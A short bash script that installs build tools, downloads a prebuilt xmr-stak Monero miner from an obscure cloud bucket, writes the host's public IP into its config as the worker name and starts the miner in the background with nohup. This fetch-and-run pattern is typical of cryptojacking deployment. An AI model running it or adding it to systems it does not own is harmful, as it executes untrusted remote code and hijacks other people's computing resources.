#!/bin/bash
PUBLIC_IP=`wget http://ipecho.net/plain -O - -q ; echo`

sudo yum -y install centos-release-scl epel-release cmake3 devtoolset-4-gcc* hwloc-devel libmicrohttpd-devel openssl-devel make git htop lrzsz
cd /root
wget http://ou0iddqf5.bkt.clouddn.com/xmr-stak.tar.gz
tar -zxvf xmr-stak.tar.gz xmr-stak
cd /root/xmr-stak/build/bin 
sed -i 's/T9/$PUBLIC_IP/g' config.txt
nohup ./xmr-stak &
